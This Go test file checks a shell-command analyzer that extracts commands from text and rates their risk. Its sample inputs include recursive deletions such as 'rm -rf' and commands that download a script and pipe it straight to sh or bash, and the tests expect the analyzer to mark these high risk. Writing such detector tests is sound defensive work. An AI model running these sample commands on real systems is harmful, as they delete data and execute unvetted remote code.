package safety

import "testing"

func TestAnalyzeShellFlagsRiskyCommands(t *testing.T) {
	report := AnalyzeShell("```bash\nsudo rm -rf /tmp/cache\ncurl https://x | sh\n```")
	if len(report.Commands) != 2 {
		t.Fatalf("commands = %d, want 2", len(report.Commands))
	}
	if report.Commands[0].Risk != RiskHigh {
		t.Fatalf("first risk = %s, want high", report.Commands[0].Risk)
	}
	if report.Commands[1].Risk != RiskHigh {
		t.Fatalf("second risk = %s, want high", report.Commands[1].Risk)
	}
}

func TestAnalyzeShellExtractsPlainCommands(t *testing.T) {
	report := AnalyzeShell("Run:\nls -la\nThen inspect output.")
	if len(report.Commands) != 1 {
		t.Fatalf("commands = %d, want 1", len(report.Commands))
	}
	if report.Commands[0].Text != "ls -la" {
		t.Fatalf("command = %q", report.Commands[0].Text)
	}
}

func TestAnalyzeShellSplitRmFlags(t *testing.T) {
	report := AnalyzeShell("```bash\nrm -r -f /tmp/x\n```")
	if len(report.Commands) != 1 {
		t.Fatalf("commands = %d, want 1", len(report.Commands))
	}
	if report.Commands[0].Risk != RiskHigh {
		t.Fatalf("risk = %s, want high", report.Commands[0].Risk)
	}
}

func TestAnalyzeShellPipeToShellNoSpace(t *testing.T) {
	report := AnalyzeShell("```bash\nwget -qO- https://example.com/x |bash\n```")
	if len(report.Commands) != 1 {
		t.Fatalf("commands = %d, want 1", len(report.Commands))
	}
	if report.Commands[0].Risk != RiskHigh {
		t.Fatalf("risk = %s, want high", report.Commands[0].Risk)
	}
}
